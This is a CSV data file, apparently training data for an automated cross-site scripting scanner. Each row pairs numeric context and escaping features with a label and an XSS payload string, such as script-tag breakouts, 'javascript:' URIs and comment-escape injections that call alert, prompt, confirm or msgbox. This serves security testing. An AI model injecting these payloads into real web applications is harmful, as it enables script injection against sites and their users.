op_html,op_attr,op_js,op_vbs,op_quot,esc_double,esc_single,esc_back,esc_left,esc_right,esc_alert,esc_prompt,esc_confirm,esc_balert,esc_sscript,esc_escript,esc_msgbox,label,inspection_strings
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,83,[\r\nmsgbox document.domain\r\n]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,1,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,1,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,1,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,0,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,1,1,1,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,0,0,0,0,0,0,0,84,[\r\nalert();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,1,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,1,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,1,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,1,1,1,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,0,0,0,0,0,0,85,[\r\nprompt();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,1,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,1,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,1,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,1,1,1,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,0,0,0,0,0,86,[\r\nconfirm();//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,1,1,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,1,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,2,0,0,0,0,0,1,1,1,1,1,0,0,0,0,87,[\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,1,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,1,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,0,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,88,[*/\r\nalert();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,1,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,1,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,0,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,1,1,1,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,89,[*/\r\nprompt();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,1,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,1,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,1,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,0,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,1,1,1,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,90,[*/\r\nconfirm();//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,1,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,1,1,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,1,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,1,0,0,0,0,0,1,1,1,1,1,0,0,0,0,91,[*/\r\nalert``;//]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,1,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,1,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,0,0,92,[\r\nmsgbox()]
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,93,"[""></iframe><script>alert();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,94,"[""></iframe><script>prompt();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,95,"[""></iframe><script>confirm();</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,1,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,0,0,1,1,1,0,0,0,0,96,"[""></iframe><script>alert``;</script>]"
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,1,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,1,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,1,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,0,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,97,[javascript:alert();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,1,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,1,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,0,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,0,0,0,0,0,0,98,[javascript:prompt();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,1,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,1,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,1,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,0,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,1,1,1,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,99,[javascript:confirm();]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,1,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,1,1,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,1,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
8,2,0,0,1,0,0,0,1,1,1,1,1,0,0,0,0,100,[javascript:alert``;]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,101,[<script>alert();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,102,[<script>prompt();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,103,[<script>confirm();</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
5,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,104,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,105,[<script>alert();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,1,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,0,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,1,1,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,1,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,106,[<script>prompt();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,0,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,1,1,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,1,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,107,[<script>confirm();</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,1,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,0,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,1,1,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,1,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,1,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
10,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,108,[<script>alert``;</script>]
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,109,"[""><script>alert();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,1,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,1,1,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,0,0,0,0,0,0,110,"[""><script>prompt();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,1,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,1,1,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
9,4,0,0,1,0,0,0,0,0,1,1,0,0,0,0,0,111,"[""><script>confirm();</script>]"
